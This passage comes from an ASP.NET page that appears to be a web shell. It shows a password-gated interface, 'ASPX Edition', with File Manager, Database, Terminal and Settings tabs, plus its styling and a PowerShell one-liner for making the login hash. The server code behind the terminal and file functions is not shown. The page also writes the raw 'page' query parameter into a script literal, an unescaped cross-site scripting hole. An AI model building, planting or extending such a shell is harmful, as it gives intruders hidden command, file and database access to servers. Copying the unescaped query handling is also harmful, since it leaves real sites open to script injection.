        <span class='info-label'>Application Version</span>
        <span class='info-value'>" + AppVersion + @"</span>
    </div>
    <div class='info-row'>
        <span class='info-label'>Debug Mode</span>
        <span class='info-value'>" + (DebugMode ? "Enabled" : "Disabled") + @"</span>
    </div>
    <div class='info-row'>
        <span class='info-label'>Session Timeout</span>
        <span class='info-value'>20 minutes</span>
    </div>
</div>

<div class='card'>
    <div class='card-header'><h3>Password Change</h3></div>
    <p class='text-muted mb-2'>Generate new password hash:</p>
    <code>PowerShell:</code><br>
    <code>[System.BitConverter]::ToString([System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes(""yourpassword""))).Replace(""-"","""").ToLower()</code>
    <p class='text-muted' style='margin-top:1rem;'>Then update AUTH_HASH in index.aspx</p>
</div>
");
    
    phContent.Controls.Add(new Literal { Text = html.ToString() });
}
</script>

<!DOCTYPE html>
<html>
<head runat="server">
    <title><%= AppName %></title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: #f5f7fa;
            color: #333;
        }
        
        /* Login Page Styles */
        .login-body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .login-container {
            background: white;
            padding: 3rem;
            border-radius: 12px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        .login-container h1 {
            color: #333;
            font-size: 2rem;
            margin-bottom: 0.5rem;
        }
        .login-container p {
            color: #666;
            margin-bottom: 2rem;
        }
        .form-control {
            width: 100%;
            padding: 0.75rem;
            border: 2px solid #e0e0e0;
            border-radius: 6px;
            font-size: 1rem;
            margin-bottom: 1rem;
        }
        .form-control:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }
        
        /* Top Navigation */
        .topnav {
            background: linear-gradient(135deg, #1e3a8a 0%, #3b82f6 100%);
            color: white;
            padding: 0;
            display: flex;
            align-items: center;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }
        .nav-brand {
            padding: 1rem 1.5rem;
            font-size: 1.25rem;
            font-weight: 600;
            border-right: 1px solid rgba(255,255,255,0.1);
        }
        .nav-tabs {
            display: flex;
            flex: 1;
            list-style: none;
            margin: 0;
            padding: 0;
        }
        .nav-tabs li { display: inline-block; }
        .nav-tabs a {
            display: block;
            padding: 1rem 1.5rem;
            color: rgba(255,255,255,0.8);
            text-decoration: none;
            transition: all 0.3s;
            border-bottom: 3px solid transparent;
        }
        .nav-tabs a:hover, .nav-tabs a.active {
            background: rgba(255,255,255,0.1);
            color: white;
            border-bottom-color: white;
        }
        .nav-user {
            padding: 1rem 1.5rem;
            color: rgba(255,255,255,0.8);
            border-left: 1px solid rgba(255,255,255,0.1);
        }
        .nav-user a {
            color: white;
            text-decoration: none;
        }
        
        /* Container & Cards */
        .container {
            max-width: 1400px;
            margin: 2rem auto;
            padding: 0 1rem;
        }
        .card {
            background: white;
            border-radius: 8px;
            padding: 1.5rem;
            margin-bottom: 1.5rem;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .card-header {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            margin-bottom: 1rem;
            padding-bottom: 0.75rem;
            border-bottom: 2px solid #f0f0f0;
        }
        .card-icon { font-size: 1.5rem; }
        .card-header h3 {
            font-size: 1.25rem;
            color: #333;
            margin: 0;
        }
        
        /* Buttons */
        .btn {
            padding: 0.5rem 1rem;
            border: none;
            border-radius: 6px;
            font-size: 0.9rem;
            cursor: pointer;
            transition: all 0.2s;
            display: inline-block;
        }
        .btn-primary {
            background: #3b82f6;
            color: white;
        }
        .btn-primary:hover {
            background: #2563eb;
            transform: translateY(-1px);
        }
        .btn-secondary {
            background: #6b7280;
            color: white;
        }
        .btn-secondary:hover {
            background: #4b5563;
        }
        .btn-danger {
            background: #ef4444;
            color: white;
        }
        .btn-danger:hover {
            background: #dc2626;
        }
        .btn-sm {
            padding: 0.35rem 0.75rem;
            font-size: 0.85rem;
        }
        
        /* Info Rows */
        .info-row {
            display: flex;
            justify-content: space-between;
            padding: 0.75rem 0;
            border-bottom: 1px solid #f0f0f0;
        }
        .info-row:last-child { border-bottom: none; }
        .info-label {
            font-weight: 500;
            color: #666;
        }
        .info-value {
            color: #333;
            font-family: 'Courier New', monospace;
        }
        
        /* File Manager */
        .toolbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            gap: 1rem;
            flex-wrap: wrap;
        }
        .path-nav {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            flex: 1;
        }
        .path-label {
            font-size: 1.25rem;
        }
        .path-input {
            flex: 1;
            max-width: 600px;
        }
        .toolbar-actions {
            display: flex;
            gap: 0.5rem;
        }
        .file-table {
            width: 100%;
            border-collapse: collapse;
        }
        .file-table th {
            background: #f8f9fa;
            padding: 0.75rem;
            text-align: left;
            font-weight: 600;
            border-bottom: 2px solid #e0e0e0;
        }
        .file-table td {
            padding: 0.75rem;
            border-bottom: 1px solid #f0f0f0;
        }
        .file-table tr:hover {
            background: #f8f9fa;
            cursor: pointer;
        }
        .file-icon {
            margin-right: 0.5rem;
        }
        .file-name.dir {
            color: #3b82f6;
            font-weight: 500;
        }
        .action-btns {
            display: flex;
            gap: 0.25rem;
        }
        .action-btn {
            padding: 0.25rem 0.5rem;
            background: transparent;
            border: 1px solid #e0e0e0;
            border-radius: 4px;
            cursor: pointer;
            font-size: 1rem;
        }
        .action-btn:hover {
            background: #f0f0f0;
        }
        .action-btn.danger:hover {
            background: #fee;
            border-color: #ef4444;
        }
        
        /* Terminal */
        .terminal-container {
            background: #0d1117;
            border-radius: 6px;
            padding: 1rem;
            font-family: 'Courier New', monospace;
            color: #c9d1d9;
        }
        .terminal-output {
            background: #161b22;
            padding: 1rem;
            border-radius: 4px;
            min-height: 300px;
            max-height: 500px;
            overflow-y: auto;
            margin-bottom: 1rem;
            white-space: pre-wrap;
            font-size: 0.9rem;
        }
        .terminal-input {
            display: flex;
            gap: 0.5rem;
        }
        .terminal-input input {
            flex: 1;
            background: #161b22;
            border: 1px solid #30363d;
            color: #c9d1d9;
            padding: 0.5rem;
            border-radius: 4px;
        }
        
        /* Database */
        .db-form {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 1rem;
            margin-bottom: 1rem;
        }
        .db-query {
            margin-bottom: 1rem;
        }
        .db-query textarea {
            width: 100%;
            min-height: 100px;
            padding: 0.75rem;
            border: 2px solid #e0e0e0;
            border-radius: 6px;
            font-family: 'Courier New', monospace;
        }
        .db-table {
            overflow-x: auto;
        }
        .db-table table {
            width: 100%;
            border-collapse: collapse;
            font-size: 0.9rem;
        }
        .db-table th {
            background: #f8f9fa;
            padding: 0.5rem;
            text-align: left;
            border: 1px solid #e0e0e0;
        }
        .db-table td {
            padding: 0.5rem;
            border: 1px solid #e0e0e0;
        }
        
        /* Modals */
        .modal-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            z-index: 1000;
            align-items: center;
            justify-content: center;
        }
        .modal-overlay.active {
            display: flex;
        }
        .modal {
            background: white;
            border-radius: 8px;
            width: 90%;
            max-width: 500px;
            max-height: 90vh;
            overflow: auto;
        }
        .modal-lg {
            max-width: 900px;
        }
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 1rem 1.5rem;
            border-bottom: 1px solid #e0e0e0;
        }
        .modal-header h3 {
            margin: 0;
        }
        .modal-close {
            background: none;
            border: none;
            font-size: 1.5rem;
            cursor: pointer;
            color: #666;
        }
        .modal-body {
            padding: 1.5rem;
        }
        .modal-footer {
            padding: 1rem 1.5rem;
            border-top: 1px solid #e0e0e0;
            display: flex;
            justify-content: flex-end;
            gap: 0.5rem;
        }
        .file-editor {
            width: 100%;
            min-height: 400px;
            padding: 1rem;
            border: 2px solid #e0e0e0;
            border-radius: 6px;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
        }
        
        /* Toast Notifications */
        .toast {
            position: fixed;
            top: 2rem;
            right: 2rem;
            background: #333;
            color: white;
            padding: 1rem 1.5rem;
            border-radius: 6px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
            z-index: 2000;
            animation: slideIn 0.3s;
        }
        .toast.success {
            background: #10b981;
        }
        .toast.error {
            background: #ef4444;
        }
        @keyframes slideIn {
            from {
                transform: translateX(400px);
                opacity: 0;
            }
            to {
                transform: translateX(0);
                opacity: 1;
            }
        }
        
        /* Utilities */
        .text-center { text-align: center; }
        .text-muted { color: #6b7280; }
        .mb-1 { margin-bottom: 0.5rem; }
        .mb-2 { margin-bottom: 1rem; }
    </style>
</head>
<body<% if (!IsAuthenticated()) { %> class="login-body"<% } %>>
    <form id="form1" runat="server">
        <% if (!IsAuthenticated()) { %>
            <!-- Login Page -->
            <div class="login-container">
                <h1>🐚 <%= AppName %></h1>
                <p>ASPX Edition v<%= AppVersion %></p>
                <asp:TextBox ID="txtPassword" runat="server" TextMode="Password" placeholder="Password" CssClass="form-control" />
                <asp:Button ID="btnLogin" runat="server" Text="🔐 Login" OnClick="btnLogin_Click" CssClass="btn btn-primary" style="width:100%;"/>
                <p class="text-muted" style="margin-top:1.5rem;font-size:0.85rem;">Version <%= AppVersion %></p>
            </div>
        <% } else { %>
            <!-- Main Application -->
            <nav class="topnav">
                <div class="nav-brand">🐚 <%= AppName %></div>
                <ul class="nav-tabs">
                    <li><a href="?page=dashboard" <% if (Request.QueryString["page"] == "dashboard" || String.IsNullOrEmpty(Request.QueryString["page"])) { %>class="active"<% } %>>📊 Dashboard</a></li>
                    <li><a href="?page=files" <% if (Request.QueryString["page"] == "files") { %>class="active"<% } %>>📁 File Manager</a></li>
                    <li><a href="?page=database" <% if (Request.QueryString["page"] == "database") { %>class="active"<% } %>>🗄️ Database</a></li>
                    <li><a href="?page=terminal" <% if (Request.QueryString["page"] == "terminal") { %>class="active"<% } %>>💻 Terminal</a></li>
                    <li><a href="?page=settings" <% if (Request.QueryString["page"] == "settings") { %>class="active"<% } %>>⚙️ Settings</a></li>
                </ul>
                <div class="nav-user">
                    Session: <%= GetSessionTime() %> | 
                    <asp:LinkButton ID="btnLogout" runat="server" OnClick="btnLogout_Click">Logout</asp:LinkButton>
                </div>
            </nav>
            
            <div class="container">
                <asp:PlaceHolder ID="phContent" runat="server" />
            </div>
            
            <!-- Modals and Toast Container -->
            <div id="toastContainer"></div>
            
            <script>
                // Toast notifications
                function toast(message, type) {
                    var toast = document.createElement('div');
                    toast.className = 'toast ' + (type || 'success');
                    toast.textContent = message;
                    document.body.appendChild(toast);
                    setTimeout(function() { toast.remove(); }, 3000);
                }
                
                // Modal functions
                function showModal(id) {
                    document.getElementById(id).classList.add('active');
                }
                function closeModal(id) {
                    document.getElementById(id).classList.remove('active');
                }
                
                // Page-specific initialization
                var currentPage = '<%= Request.QueryString["page"] ?? "dashboard" %>';
                if (currentPage === 'files') {
                    document.addEventListener('DOMContentLoaded', initFileManager);
                } else if (currentPage === 'terminal') {
                    document.addEventListener('DOMContentLoaded', initTerminal);
                } else if (currentPage === 'database') {
                    document.addEventListener('DOMContentLoaded', initDatabase);
                }
            </script>
        <% } %>
    </form>
</body>
</html>
